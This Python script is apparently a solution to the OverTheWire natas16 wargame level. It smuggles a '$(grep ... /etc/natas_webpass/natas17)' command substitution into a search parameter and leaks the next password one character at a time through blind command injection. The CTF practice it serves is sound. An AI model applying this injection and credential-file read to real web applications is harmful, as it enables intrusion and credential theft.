
import re,requests,base64,natas,string

USER='natas16'
PASSWORD=natas.get_credential(USER)

URL='http://natas16.natas.labs.overthewire.org/index.php'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))
    
    password = ''
    running = True
    while (running):
        found = False
        for c in string.ascii_letters + string.digits :
            if (guessed_correct(password + c, b64)):
                password = password + c
                found = True
                print(password)
                break
        if (not found):
            break
    
    if (len(password) > 30):
        print('found password: %s' % password)
        print('adding to credentials....')
        natas.save_credentials('natas17',password)
        print('done')

            

def guessed_correct(password, b64):
    regex = r"giraffes"
    QUERY='giraffes$(grep -e ^%s /etc/natas_webpass/natas17)' % password
    
    response = requests.get(
            URL,
            headers=dict(Authorization='Basic %s' % b64),
            params=dict(needle=QUERY,submit="Search")
    )
    
    correct = True
    matches = re.finditer(regex,response.content,re.MULTILINE)
    for match in matches:
        correct = False

    return correct


if __name__=='__main__':
    main()

#    http://natas16.natas.labs.overthewire.org/index.php?needle=giraffes%24%28grep+b+etc%2Fnatas_webpass%2Fnatas17%29
